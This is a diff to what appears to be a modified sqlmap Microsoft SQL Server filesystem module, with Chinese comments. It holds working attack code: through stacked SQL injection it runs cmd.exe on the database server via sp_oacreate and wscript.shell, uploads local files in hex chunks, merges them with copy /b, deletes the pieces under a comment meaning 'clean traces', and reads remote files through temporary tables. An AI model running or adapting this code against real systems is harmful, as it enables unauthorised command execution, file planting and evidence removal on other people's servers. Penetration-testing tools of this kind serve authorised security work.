@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
 See the file 'LICENSE' for copying permission
 """
 
@@ -90,7 +90,6 @@ class Filesystem(GenericFilesystem):
         self.execCmd(" & ".join(command for command in commands))
 
         return chunkName
-
     def clrStackedReadFile(self, remoteFile):
         if not kb.bruteMode:
             infoMsg = "fetching file: '%s'" % remoteFile
@@ -98,14 +97,6 @@ class Filesystem(GenericFilesystem):
 
         result = []
         if Backend.isDbms(DBMS.MSSQL):
-            # tblName = "clrsqlfile"
-            # tblField = "data"
-            # tblType = "VARBINARY(MAX)"
-            # inject.goStacked("DROP TABLE %s" % tblName, silent=True)
-            # inject.goStacked("CREATE TABLE %s(id INT PRIMARY KEY IDENTITY, %s %s)" % (tblName, tblField, tblType))
-
-            # inject.goStacked("INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS %s(%s)" % (tblName, tblField, tblField, remoteFile, tblName, tblField))
-
             result = []
 
             hexTbl = "%s%shex" % (self.fileTblName, randomStr())
@@ -124,10 +115,6 @@ class Filesystem(GenericFilesystem):
         if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
             result = inject.getValue("select data from %s"%(hexTbl))
 
-            # if result:
-            #
-            #     with open("E:\\111.txt", "wb") as f:
-            #         f.write(binascii.unhexlify(result))
         if not result:
             result = []
             tblField = 'data'
@@ -205,6 +192,7 @@ class Filesystem(GenericFilesystem):
 
         binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
         inject.goStacked(binToHexQuery)
+
         if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
             result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)
 
@@ -303,7 +291,6 @@ class Filesystem(GenericFilesystem):
 
         query = "SELECT %s FROM %s" % (self.tblField, hexTbl)
 
-        # 有回显注入直接从回显注入里面查询
         if any(isTechniqueAvailable(_) for _ in
                (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
             output = inject.getValue(query, resumeValue=False, blind=False, time=False)
@@ -321,7 +308,6 @@ class Filesystem(GenericFilesystem):
             if isNumPosStrValue(count):
                 for index in getLimitRange(count):
                     query = agent.limitQuery(index, query, self.tblField)
-                    # 获取最终的输出
                     output.append(inject.getValue(query, union=False, error=False, resumeValue=False))
 
         inject.goStacked("DELETE FROM %s" % hexTbl)
@@ -396,12 +382,10 @@ class Filesystem(GenericFilesystem):
 
     def oleUpload(self,localFile,remoteFile):
         print('Local File: '+localFile)
-        remoteFile = remoteFile.replace("/", "\\")
         print('Remote File: ' + remoteFile)
         checkFile(localFile)
         s = open(localFile, 'rb').read()
         content = binascii.hexlify(s).decode()
-
 
         l = [content[i:i + 150000] for i in range(0, len(content), 150000)]
         print(len(l))
@@ -433,6 +417,7 @@ class Filesystem(GenericFilesystem):
                         remoteFile, i, remoteFile, i + 1, remoteFile, i + 1
                     ))
 
+        # 合并文件
         if len(l) > 2:
             inject.goStacked(
                 "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}_tmp+{}_{} {}'".format(
@@ -444,10 +429,13 @@ class Filesystem(GenericFilesystem):
                     remoteFile, len(l) - 1, remoteFile, len(l), remoteFile
                 ))
 
+        # 清理痕迹
         inject.goStacked(
             "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c del {}_*'".format(remoteFile))
         print('The file upload process has ended. You can use --check-file to determine if the upload was successful')
         print('文件上传流程结束，可使用--check-file判断上传是否成功')
+
+
 
     def _stackedWriteFileDebugExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
         infoMsg = "using debug.exe to write the %s " % fileType
